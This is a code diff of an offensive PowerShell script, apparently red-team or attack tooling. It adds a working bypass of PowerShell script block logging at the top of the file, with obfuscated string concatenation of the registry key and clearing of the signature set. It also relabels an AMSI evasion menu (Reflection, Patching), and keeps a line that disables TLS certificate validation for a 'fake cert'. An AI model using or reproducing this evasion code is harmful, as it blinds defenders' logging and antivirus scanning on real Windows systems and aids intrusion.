@@ -1,3 +1,10 @@
+Write-host " "
+Write-host "Running script block logging bypass"
+$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
+$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'] = @{}
+$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'].Add('EnableScriptBlockLogging',"0")
+[Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))
+
 function AV-Bypass-Setup
 <#
 .SYNOPSIS
@@ -14,7 +21,7 @@ function AV-Bypass-Setup
 #>
 { 
 	Write-host ""
-	Write-host "Evasion technique: "
+	Write-host "AMSI evasion technique: "
 	Write-host ""
 	Write-host "1 Reflection "
 	Write-host "2 Patching"
@@ -77,10 +84,6 @@ public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint 
 		default {return}
 	}
 	
-	$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
-	$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
-	$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging","0")
-
     #Needed for https call with fake cert
     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ;
 
